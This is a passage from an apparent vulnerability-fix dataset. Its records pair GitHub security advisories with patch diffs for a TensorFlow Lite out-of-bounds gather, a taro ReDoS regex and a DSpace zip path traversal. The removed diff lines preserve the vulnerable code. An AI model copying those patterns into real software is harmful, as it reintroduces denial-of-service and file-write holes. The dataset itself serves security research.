            "code_diff":"@@ -117,8 +117,20 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\n }\n \n template <typename InputT, typename PositionsT>\n-TfLiteStatus Gather(const TfLiteGatherParams& params, const TfLiteTensor* input,\n-                    const TfLiteTensor* positions, TfLiteTensor* output) {\n+TfLiteStatus Gather(TfLiteContext* context, const TfLiteGatherParams& params,\n+                    const TfLiteTensor* input, const TfLiteTensor* positions,\n+                    TfLiteTensor* output) {\n+  const PositionsT* indexes = GetTensorData<PositionsT>(positions);\n+  bool indices_has_only_positive_elements = true;\n+  const size_t num_indices = positions->bytes \/ sizeof(PositionsT);\n+  for (size_t i = 0; i < num_indices; i++) {\n+    if (indexes[i] < 0) {\n+      indices_has_only_positive_elements = false;\n+      break;\n+    }\n+  }\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\n+\n   tflite::GatherParams op_params;\n   op_params.axis = params.axis;\n   op_params.batch_dims = params.batch_dims;\n@@ -134,7 +146,18 @@ TfLiteStatus GatherStrings(TfLiteContext* context, const TfLiteTensor* input,\n                            const TfLiteTensor* positions,\n                            TfLiteTensor* output) {\n   DynamicBuffer buffer;\n+\n   const PositionT* indexes = GetTensorData<PositionT>(positions);\n+  bool indices_has_only_positive_elements = true;\n+  const size_t num_indices = positions->bytes \/ sizeof(PositionT);\n+  for (size_t i = 0; i < num_indices; i++) {\n+    if (indexes[i] < 0) {\n+      indices_has_only_positive_elements = false;\n+      break;\n+    }\n+  }\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\n+\n   const PositionT num_strings = GetStringCount(input);\n   const int num_indexes = NumElements(positions);\n \n@@ -163,19 +186,26 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\n   if (positions->type == kTfLiteInt32) {\n     switch (input->type) {\n       case kTfLiteFloat32:\n-        return Gather<float, int32_t>(*params, input, positions, output);\n+        return Gather<float, int32_t>(context, *params, input, positions,\n+                                      output);\n       case kTfLiteUInt8:\n-        return Gather<uint8_t, int32_t>(*params, input, positions, output);\n+        return Gather<uint8_t, int32_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt8:\n-        return Gather<int8_t, int32_t>(*params, input, positions, output);\n+        return Gather<int8_t, int32_t>(context, *params, input, positions,\n+                                       output);\n       case kTfLiteInt16:\n-        return Gather<int16_t, int32_t>(*params, input, positions, output);\n+        return Gather<int16_t, int32_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt32:\n-        return Gather<int32_t, int32_t>(*params, input, positions, output);\n+        return Gather<int32_t, int32_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt64:\n-        return Gather<int64_t, int32_t>(*params, input, positions, output);\n+        return Gather<int64_t, int32_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteBool:\n-        return Gather<bool, int32_t>(*params, input, positions, output);\n+        return Gather<bool, int32_t>(context, *params, input, positions,\n+                                     output);\n       case kTfLiteString:\n         return GatherStrings<int32_t>(context, input, positions, output);\n       default:\n@@ -187,19 +217,26 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\n   if (positions->type == kTfLiteInt64) {\n     switch (input->type) {\n       case kTfLiteFloat32:\n-        return Gather<float, int64_t>(*params, input, positions, output);\n+        return Gather<float, int64_t>(context, *params, input, positions,\n+                                      output);\n       case kTfLiteUInt8:\n-        return Gather<uint8_t, int64_t>(*params, input, positions, output);\n+        return Gather<uint8_t, int64_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt8:\n-        return Gather<int8_t, int64_t>(*params, input, positions, output);\n+        return Gather<int8_t, int64_t>(context, *params, input, positions,\n+                                       output);\n       case kTfLiteInt16:\n-        return Gather<int16_t, int64_t>(*params, input, positions, output);\n+        return Gather<int16_t, int64_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt32:\n-        return Gather<int32_t, int64_t>(*params, input, positions, output);\n+        return Gather<int32_t, int64_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteInt64:\n-        return Gather<int64_t, int64_t>(*params, input, positions, output);\n+        return Gather<int64_t, int64_t>(context, *params, input, positions,\n+                                        output);\n       case kTfLiteBool:\n-        return Gather<bool, int64_t>(*params, input, positions, output);\n+        return Gather<bool, int64_t>(context, *params, input, positions,\n+                                     output);\n       case kTfLiteString:\n         return GatherStrings<int64_t>(context, input, positions, output);\n       default:"
        },
        {
            "index":812,
            "vuln_id":"GHSA-468q-v4jj-485h",
            "cwe_id":"{'CWE-1333'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/nervjs\/taro\/commit\/acadb6c826ba57f2030a626f1de4f7b4608fcdb5'}",
            "dataset":"osv",
            "summary":"Inefficient Regular Expression Complexity in taro taro is vulnerable to Inefficient Regular Expression Complexity",
            "published_date":"2021-09-20",
            "chain_len":1,
            "project":"https:\/\/github.com\/nervjs\/taro",
            "commit_href":"https:\/\/github.com\/nervjs\/taro\/commit\/acadb6c826ba57f2030a626f1de4f7b4608fcdb5",
            "commit_sha":"acadb6c826ba57f2030a626f1de4f7b4608fcdb5",
            "patch":"SINGLE",
            "chain_ord":"['acadb6c826ba57f2030a626f1de4f7b4608fcdb5']",
            "before_first_fix_commit":"{'51a672907177558f20d664e7c196fdb0bff41c75'}",
            "last_fix_commit":"acadb6c826ba57f2030a626f1de4f7b4608fcdb5",
            "chain_ord_pos":1.0,
            "commit_datetime":"09\/02\/2021, 14:08:46",
            "message":"Security fix for ReDoS\n\nFixed Regular Expression Denial of Service vulnerability in url validation",
            "author":"ready-research",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'packages\/taro-helper\/src\/constants.ts': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/NervJS\/taro\/raw\/acadb6c826ba57f2030a626f1de4f7b4608fcdb5\/packages%2Ftaro-helper%2Fsrc%2Fconstants.ts', 'patch': '@@ -104,7 +104,7 @@ export const REG_JSON = \/\\\\.json(\\\\?.*)?$\/\\n export const REG_UX = \/\\\\.ux(\\\\?.*)?$\/\\n export const REG_TEMPLATE = \/\\\\.(wxml|axml|ttml|qml|swan|jxml)(\\\\?.*)?$\/\\n export const REG_WXML_IMPORT = \/<import(.*)?src=(?:(?:\\'([^\\']*)\\')|(?:\"([^\"]*)\"))\/gi\\n-export const REG_URL = \/^(?:(?:(?:https?|ftp):)?\\\\\/\\\\\/)(?:\\\\S+(?::\\\\S*)?@)?(?:(?!(?:10|127)(?:\\\\.\\\\d{1,3}){3})(?!(?:169\\\\.254|192\\\\.168)(?:\\\\.\\\\d{1,3}){2})(?!172\\\\.(?:1[6-9]|2\\\\d|3[0-1])(?:\\\\.\\\\d{1,3}){2})(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[1-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z\\\\u00a1-\\\\uffff0-9]-*)*[a-z\\\\u00a1-\\\\uffff0-9]+)(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff0-9]-*)*[a-z\\\\u00a1-\\\\uffff0-9]+)*(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff]{2,}))\\\\.?)(?::\\\\d{2,5})?(?:[\/?#]\\\\S*)?$\/i\\n+export const REG_URL = \/^(?:(?:(?:https?|ftp):)?\\\\\/\\\\\/)(?:\\\\S+(?::\\\\S*)?@)?(?:(?!(?:10|127)(?:\\\\.\\\\d{1,3}){3})(?!(?:169\\\\.254|192\\\\.168)(?:\\\\.\\\\d{1,3}){2})(?!172\\\\.(?:1[6-9]|2\\\\d|3[0-1])(?:\\\\.\\\\d{1,3}){2})(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[1-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z0-9\\\\u00a1-\\\\uffff][a-z0-9\\\\u00a1-\\\\uffff_-]{0,62})?[a-z0-9\\\\u00a1-\\\\uffff]\\\\.)+(?:[a-z\\\\u00a1-\\\\uffff]{2,}\\\\.?))(?::\\\\d{2,5})?(?:[\/?#]\\\\S*)?$\/i\\n export const CSS_IMPORT_REG = \/@import ([\"\\'])(.+?)\\\\1;\/g\\n \\n export const NODE_MODULES = \\'node_modules\\''}}",
            "message_norm":"security fix for redos\n\nfixed regular expression denial of service vulnerability in url validation",
            "language":"en",
            "entities":"[('security', 'SECWORD', ''), ('redos', 'SECWORD', ''), ('fixed', 'ACTION', ''), ('denial of service', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('url validation', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['packages\/taro-helper\/src\/constants.ts'])",
            "num_files":1.0,
            "patch_content":"From acadb6c826ba57f2030a626f1de4f7b4608fcdb5 Mon Sep 17 00:00:00 2001\nFrom: ready-research <72916209+ready-research@users.noreply.github.com>\nDate: Thu, 2 Sep 2021 19:38:46 +0530\nSubject: [PATCH] Security fix for ReDoS\n\nFixed Regular Expression Denial of Service vulnerability in url validation\n---\n packages\/taro-helper\/src\/constants.ts | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/packages\/taro-helper\/src\/constants.ts b\/packages\/taro-helper\/src\/constants.ts\nindex cc2d6070c44c..06c0d0832aaf 100644\n--- a\/packages\/taro-helper\/src\/constants.ts\n+++ b\/packages\/taro-helper\/src\/constants.ts\n@@ -104,7 +104,7 @@ export const REG_JSON = \/\\.json(\\?.*)?$\/\n export const REG_UX = \/\\.ux(\\?.*)?$\/\n export const REG_TEMPLATE = \/\\.(wxml|axml|ttml|qml|swan|jxml)(\\?.*)?$\/\n export const REG_WXML_IMPORT = \/<import(.*)?src=(?:(?:'([^']*)')|(?:\"([^\"]*)\"))\/gi\n-export const REG_URL = \/^(?:(?:(?:https?|ftp):)?\\\/\\\/)(?:\\S+(?::\\S*)?@)?(?:(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)(?:\\.(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)*(?:\\.(?:[a-z\\u00a1-\\uffff]{2,}))\\.?)(?::\\d{2,5})?(?:[\/?#]\\S*)?$\/i\n+export const REG_URL = \/^(?:(?:(?:https?|ftp):)?\\\/\\\/)(?:\\S+(?::\\S*)?@)?(?:(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z0-9\\u00a1-\\uffff][a-z0-9\\u00a1-\\uffff_-]{0,62})?[a-z0-9\\u00a1-\\uffff]\\.)+(?:[a-z\\u00a1-\\uffff]{2,}\\.?))(?::\\d{2,5})?(?:[\/?#]\\S*)?$\/i\n export const CSS_IMPORT_REG = \/@import ([\"'])(.+?)\\1;\/g\n \n export const NODE_MODULES = 'node_modules'",
            "code_diff":"@@ -104,7 +104,7 @@ export const REG_JSON = \/\\.json(\\?.*)?$\/\n export const REG_UX = \/\\.ux(\\?.*)?$\/\n export const REG_TEMPLATE = \/\\.(wxml|axml|ttml|qml|swan|jxml)(\\?.*)?$\/\n export const REG_WXML_IMPORT = \/<import(.*)?src=(?:(?:'([^']*)')|(?:\"([^\"]*)\"))\/gi\n-export const REG_URL = \/^(?:(?:(?:https?|ftp):)?\\\/\\\/)(?:\\S+(?::\\S*)?@)?(?:(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)(?:\\.(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)*(?:\\.(?:[a-z\\u00a1-\\uffff]{2,}))\\.?)(?::\\d{2,5})?(?:[\/?#]\\S*)?$\/i\n+export const REG_URL = \/^(?:(?:(?:https?|ftp):)?\\\/\\\/)(?:\\S+(?::\\S*)?@)?(?:(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z0-9\\u00a1-\\uffff][a-z0-9\\u00a1-\\uffff_-]{0,62})?[a-z0-9\\u00a1-\\uffff]\\.)+(?:[a-z\\u00a1-\\uffff]{2,}\\.?))(?::\\d{2,5})?(?:[\/?#]\\S*)?$\/i\n export const CSS_IMPORT_REG = \/@import ([\"'])(.+?)\\1;\/g\n \n export const NODE_MODULES = 'node_modules'"
        },
        {
            "index":565,
            "vuln_id":"GHSA-8rmh-55h4-93h5",
            "cwe_id":"{'CWE-22'}",
            "score":7.2,
            "chain":"{'https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/56e76049185bbd87c994128a9d77735ad7af0199'}",
            "dataset":"osv",
            "summary":"DSpace ItemImportService API Vulnerable to Path Traversal in Simple Archive Format Package Import ### Impact\nItemImportServiceImpl is vulnerable to a path traversal vulnerability. This means a malicious SAF (simple archive format) package could cause a file\/directory to be created anywhere the Tomcat\/DSpace user can write to on the server.  However, this path traversal vulnerability is only possible by a user with special privileges (either Administrators or someone with command-line access to the server).  This vulnerability impacts the XMLUI, JSPUI and command-line.\n\n_This vulnerability does NOT impact 7.x._\n\n### Patches\n\n_DSpace 6.x:_ \n* Fixed in 6.4 via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0\n* 6.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0.patch (may be applied manually if an immediate upgrade to 6.4 or 7.x is not possible)\n\n_DSpace 5.x:_\n* Fixed in 5.11 via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/56e76049185bbd87c994128a9d77735ad7af0199\n* 5.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/56e76049185bbd87c994128a9d77735ad7af0199.patch (may be applied manually if an immediate upgrade to 5.11 or 6.4 or 7.x is not possible)\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs \/ configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### Workarounds\n\nAs a basic workaround, you may block all access to the following URL paths:\n* If you are using the XMLUI, block all access to `\/admin\/batchimport` path (this is the URL of the Admin Batch Import tool). Keep in mind, if your site uses the path \"\/xmlui\", then you'd need to block access to `\/xmlui\/admin\/batchimport`.\n* If you are using the JSPUI, block all access to `\/dspace-admin\/batchimport` path (this is the URL of the Admin Batch Import tool).  Keep in mind, if your site uses the path \"\/jspui\", then you'd need to block access to `\/jspui\/dspace-admin\/batchimport`.\n\nKeep in mind, only an Administrative user or a user with command-line access to the server is able to import\/upload SAF packages. Therefore, assuming those users do not blindly upload untrusted SAF packages, then it is unlikely your site could be impacted by this vulnerability.\n\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org",
            "published_date":"2022-08-06",
            "chain_len":2,
            "project":"https:\/\/github.com\/DSpace\/DSpace",
            "commit_href":"https:\/\/github.com\/DSpace\/DSpace\/commit\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0",
            "commit_sha":"7af52a0883a9dbc475cf3001f04ed11b24c8a4c0",
            "patch":"MULTI",
            "chain_ord":"['7af52a0883a9dbc475cf3001f04ed11b24c8a4c0', '56e76049185bbd87c994128a9d77735ad7af0199']",
            "before_first_fix_commit":"{'73cdff26fdc40bb022e21dcfdeefebf28057cde7'}",
            "last_fix_commit":"56e76049185bbd87c994128a9d77735ad7af0199",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/08\/2020, 00:44:54",
            "message":"[DS-4131] Fix zip import handling to avoid path traversal exploit",
            "author":"Kim Shepherd",
            "comments":null,
            "stats":"{'additions': 36, 'deletions': 7, 'total': 43}",
            "files":"{'dspace-api\/src\/main\/java\/org\/dspace\/app\/itemimport\/ItemImportServiceImpl.java': {'additions': 36, 'deletions': 7, 'changes': 43, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DSpace\/DSpace\/raw\/7af52a0883a9dbc475cf3001f04ed11b24c8a4c0\/dspace-api%2Fsrc%2Fmain%2Fjava%2Forg%2Fdspace%2Fapp%2Fitemimport%2FItemImportServiceImpl.java', 'patch': '@@ -55,6 +55,8 @@\\n import javax.xml.transform.TransformerException;\\n import java.io.*;\\n import java.net.URL;\\n+import java.nio.file.Path;\\n+import java.nio.file.Paths;\\n import java.sql.SQLException;\\n import java.text.SimpleDateFormat;\\n import java.util.*;\\n@@ -1630,26 +1632,36 @@ public String unzip(File zipfile, String destDir) throws IOException {\\n         {\\n             log.error(\"Zip file \\'\" + zipfile.getAbsolutePath() + \"\\' does not exist, or is not readable.\");\\n         }\\n+        log.debug(\"Extracting zip at \" + zipfile.getAbsolutePath());\\n \\n         String destinationDir = destDir;\\n         if (destinationDir == null){\\n         \\tdestinationDir = tempWorkDir;\\n         }\\n+        log.debug(\"Using directory \" + destinationDir + \" for zip extraction. (destDir arg is \" + destDir +\\n+                \", tempWorkDir is \" + tempWorkDir + \")\");\\n \\n         File tempdir = new File(destinationDir);\\n         if (!tempdir.isDirectory())\\n         {\\n-            log.error(\"\\'\" + ConfigurationManager.getProperty(\"org.dspace.app.itemexport.work.dir\") +\\n-                    \"\\' as defined by the key \\'org.dspace.app.itemexport.work.dir\\' in dspace.cfg \" +\\n+            log.error(\"\\'\" + ConfigurationManager.getProperty(\"org.dspace.app.batchitemexport.work.dir\") +\\n+                    \"\\' as defined by the key \\'org.dspace.app.batchitemexport.work.dir\\' in dspace.cfg \" +\\n                     \"is not a valid directory\");\\n         }\\n \\n         if (!tempdir.exists() && !tempdir.mkdirs())\\n         {\\n             log.error(\"Unable to create temporary directory: \" + tempdir.getAbsolutePath());\\n         }\\n-        String sourcedir = destinationDir + System.getProperty(\"file.separator\") + zipfile.getName();\\n-        String zipDir = destinationDir + System.getProperty(\"file.separator\") + zipfile.getName() + System.getProperty(\"file.separator\");\\n+\\n+        if(!destinationDir.endsWith(System.getProperty(\"file.separator\"))) {\\n+            destinationDir += System.getProperty(\"file.separator\");\\n+        }\\n+\\n+        String sourcedir = destinationDir + zipfile.getName();\\n+        String zipDir = destinationDir + zipfile.getName() + System.getProperty(\"file.separator\");\\n+\\n+        log.debug(\"zip directory to use is \" + zipDir);\\n \\n \\n         \/\/ 3\\n@@ -1660,11 +1672,27 @@ public String unzip(File zipfile, String destDir) throws IOException {\\n         while (entries.hasMoreElements())\\n         {\\n             entry = entries.nextElement();\\n+            \/\/ Check that the true path to extract files is never outside allowed temp directories\\n+            \/\/ without creating any actual files on disk\\n+            log.debug(\"Inspecting entry name: \" + entry.getName() + \" for path traversal security\");\\n+            File potentialExtract = new File(zipDir + entry.getName());\\n+            String canonicalPath = potentialExtract.getCanonicalPath();\\n+            log.debug(\"Canonical path to potential File is \" + canonicalPath);\\n+            if(!canonicalPath.startsWith(zipDir)) {\\n+                log.error(\"Rejecting zip file: \" + zipfile.getName() + \" as it contains an entry that would be extracted \" +\\n+                        \"outside the temporary unzip directory: \" + canonicalPath);\\n+                throw new IOException(\"Error extracting \" + zipfile + \": Canonical path of zip entry: \" +\\n+                        entry.getName() + \" (\" + canonicalPath + \") does not start with permissible temp unzip directory (\" + destinationDir +\\n+                        \")\");\\n+            }\\n+\\n             if (entry.isDirectory())\\n             {\\n-                if (!new File(zipDir + entry.getName()).mkdir())\\n-                {\\n+                \/\/ Log error and throw IOException if a directory entry could not be created\\n+                File newDir = new File(zipDir + entry.getName());\\n+                if (!newDir.mkdirs()) {\\n                     log.error(\"Unable to create contents directory: \" + zipDir + entry.getName());\\n+                    throw new IOException(\"Unable to create contents directory: \" + zipDir + entry.getName());\\n                 }\\n             }\\n             else\\n@@ -1673,6 +1701,7 @@ public String unzip(File zipfile, String destDir) throws IOException {\\n                 log.info(\"Extracting file: \" + entry.getName());\\n \\n                 int index = entry.getName().lastIndexOf(\\'\/\\');\\n+                log.debug(\"Index of \" + entry.getName() + \" is \" + index);\\n                 if (index == -1)\\n                 {\\n                     \/\/ Was it created on Windows instead?\\n@@ -1701,11 +1730,11 @@ public String unzip(File zipfile, String destDir) throws IOException {\\n                         }\\n                     }\\n \\n-\\n                 }\\n                 byte[] buffer = new byte[1024];\\n                 int len;\\n                 InputStream in = zf.getInputStream(entry);\\n+                log.debug(\"Reading \" + zipDir + entry.getName() + \" into InputStream\");\\n                 BufferedOutputStream out = new BufferedOutputStream(\\n                         new FileOutputStream(zipDir + entry.getName()));\\n                 while((len = in.read(buffer)) >= 0)'}}",
            "message_norm":"[ds-4131] fix zip import handling to avoid path traversal exploit",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('path traversal', 'SECWORD', ''), ('exploit', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['dspace-api\/src\/main\/java\/org\/dspace\/app\/itemimport\/ItemImportServiceImpl.java'])",
            "num_files":1.0,
            "patch_content":"From 7af52a0883a9dbc475cf3001f04ed11b24c8a4c0 Mon Sep 17 00:00:00 2001\nFrom: Kim Shepherd <kim@shepherd.nz>\nDate: Wed, 8 Apr 2020 12:44:54 +1200\nSubject: [PATCH] [DS-4131] Fix zip import handling to avoid path traversal\n exploit\n\n---\n ...\/app\/itemimport\/ItemImportServiceImpl.java | 43 ++++++++++++++++---\n 1 file changed, 36 insertions(+), 7 deletions(-)\n\ndiff --git a\/dspace-api\/src\/main\/java\/org\/dspace\/app\/itemimport\/ItemImportServiceImpl.java b\/dspace-api\/src\/main\/java\/org\/dspace\/app\/itemimport\/ItemImportServiceImpl.java\nindex 81c1d71b2569..4750eb41a550 100644\n--- a\/dspace-api\/src\/main\/java\/org\/dspace\/app\/itemimport\/ItemImportServiceImpl.java\n+++ b\/dspace-api\/src\/main\/java\/org\/dspace\/app\/itemimport\/ItemImportServiceImpl.java\n@@ -55,6 +55,8 @@\n import javax.xml.transform.TransformerException;\n import java.io.*;\n import java.net.URL;\n+import java.nio.file.Path;\n+import java.nio.file.Paths;\n import java.sql.SQLException;\n import java.text.SimpleDateFormat;\n import java.util.*;\n@@ -1630,17 +1632,20 @@ public String unzip(File zipfile, String destDir) throws IOException {\n         {\n             log.error(\"Zip file '\" + zipfile.getAbsolutePath() + \"' does not exist, or is not readable.\");\n         }\n+        log.debug(\"Extracting zip at \" + zipfile.getAbsolutePath());\n \n         String destinationDir = destDir;\n         if (destinationDir == null){\n         \tdestinationDir = tempWorkDir;\n         }\n+        log.debug(\"Using directory \" + destinationDir + \" for zip extraction. (destDir arg is \" + destDir +\n+                \", tempWorkDir is \" + tempWorkDir + \")\");\n \n         File tempdir = new File(destinationDir);\n         if (!tempdir.isDirectory())\n         {\n-            log.error(\"'\" + ConfigurationManager.getProperty(\"org.dspace.app.itemexport.work.dir\") +\n-                    \"' as defined by the key 'org.dspace.app.itemexport.work.dir' in dspace.cfg \" +\n+            log.error(\"'\" + ConfigurationManager.getProperty(\"org.dspace.app.batchitemexport.work.dir\") +\n+                    \"' as defined by the key 'org.dspace.app.batchitemexport.work.dir' in dspace.cfg \" +\n                     \"is not a valid directory\");\n         }\n \n@@ -1648,8 +1653,15 @@ public String unzip(File zipfile, String destDir) throws IOException {\n         {\n             log.error(\"Unable to create temporary directory: \" + tempdir.getAbsolutePath());\n         }\n-        String sourcedir = destinationDir + System.getProperty(\"file.separator\") + zipfile.getName();\n-        String zipDir = destinationDir + System.getProperty(\"file.separator\") + zipfile.getName() + System.getProperty(\"file.separator\");\n+\n+        if(!destinationDir.endsWith(System.getProperty(\"file.separator\"))) {\n+            destinationDir += System.getProperty(\"file.separator\");\n+        }\n+\n+        String sourcedir = destinationDir + zipfile.getName();\n+        String zipDir = destinationDir + zipfile.getName() + System.getProperty(\"file.separator\");\n+\n+        log.debug(\"zip directory to use is \" + zipDir);\n \n \n         \/\/ 3\n@@ -1660,11 +1672,27 @@ public String unzip(File zipfile, String destDir) throws IOException {\n         while (entries.hasMoreElements())\n         {\n             entry = entries.nextElement();\n+            \/\/ Check that the true path to extract files is never outside allowed temp directories\n+            \/\/ without creating any actual files on disk\n+            log.debug(\"Inspecting entry name: \" + entry.getName() + \" for path traversal security\");\n+            File potentialExtract = new File(zipDir + entry.getName());\n+            String canonicalPath = potentialExtract.getCanonicalPath();\n+            log.debug(\"Canonical path to potential File is \" + canonicalPath);\n+            if(!canonicalPath.startsWith(zipDir)) {\n+                log.error(\"Rejecting zip file: \" + zipfile.getName() + \" as it contains an entry that would be extracted \" +\n+                        \"outside the temporary unzip directory: \" + canonicalPath);\n+                throw new IOException(\"Error extracting \" + zipfile + \": Canonical path of zip entry: \" +\n+                        entry.getName() + \" (\" + canonicalPath + \") does not start with permissible temp unzip directory (\" + destinationDir +\n+                        \")\");\n+            }\n+\n             if (entry.isDirectory())\n             {\n-                if (!new File(zipDir + entry.getName()).mkdir())\n-                {\n+                \/\/ Log error and throw IOException if a directory entry could not be created\n+                File newDir = new File(zipDir + entry.getName());\n+                if (!newDir.mkdirs()) {\n                     log.error(\"Unable to create contents directory: \" + zipDir + entry.getName());\n+                    throw new IOException(\"Unable to create contents directory: \" + zipDir + entry.getName());\n                 }\n             }\n             else\n@@ -1673,6 +1701,7 @@ public String unzip(File zipfile, String destDir) throws IOException {\n                 log.info(\"Extracting file: \" + entry.getName());\n \n                 int index = entry.getName().lastIndexOf('\/');\n+                log.debug(\"Index of \" + entry.getName() + \" is \" + index);\n                 if (index == -1)\n                 {\n                     \/\/ Was it created on Windows instead?\n@@ -1701,11 +1730,11 @@ public String unzip(File zipfile, String destDir) throws IOException {\n                         }\n                     }\n \n-\n                 }\n                 byte[] buffer = new byte[1024];\n                 int len;\n                 InputStream in = zf.getInputStream(entry);\n+                log.debug(\"Reading \" + zipDir + entry.getName() + \" into InputStream\");\n                 BufferedOutputStream out = new BufferedOutputStream(\n                         new FileOutputStream(zipDir + entry.getName()));\n                 while((len = in.read(buffer)) >= 0)",
            "code_diff":"@@ -55,6 +55,8 @@\n import javax.xml.transform.TransformerException;\n import java.io.*;\n import java.net.URL;\n+import java.nio.file.Path;\n+import java.nio.file.Paths;\n import java.sql.SQLException;\n import java.text.SimpleDateFormat;\n import java.util.*;\n@@ -1630,17 +1632,20 @@ public String unzip(File zipfile, String destDir) throws IOException {\n         {\n             log.error(\"Zip file '\" + zipfile.getAbsolutePath() + \"' does not exist, or is not readable.\");\n         }\n+        log.debug(\"Extracting zip at \" + zipfile.getAbsolutePath());\n \n         String destinationDir = destDir;\n         if (destinationDir == null){\n         \tdestinationDir = tempWorkDir;\n         }\n+        log.debug(\"Using directory \" + destinationDir + \" for zip extraction. (destDir arg is \" + destDir +\n+                \", tempWorkDir is \" + tempWorkDir + \")\");\n \n         File tempdir = new File(destinationDir);\n         if (!tempdir.isDirectory())\n         {\n-            log.error(\"'\" + ConfigurationManager.getProperty(\"org.dspace.app.itemexport.work.dir\") +\n-                    \"' as defined by the key 'org.dspace.app.itemexport.work.dir' in dspace.cfg \" +\n+            log.error(\"'\" + ConfigurationManager.getProperty(\"org.dspace.app.batchitemexport.work.dir\") +\n+                    \"' as defined by the key 'org.dspace.app.batchitemexport.work.dir' in dspace.cfg \" +\n                     \"is not a valid directory\");\n         }\n \n@@ -1648,8 +1653,15 @@ public String unzip(File zipfile, String destDir) throws IOException {\n         {\n             log.error(\"Unable to create temporary 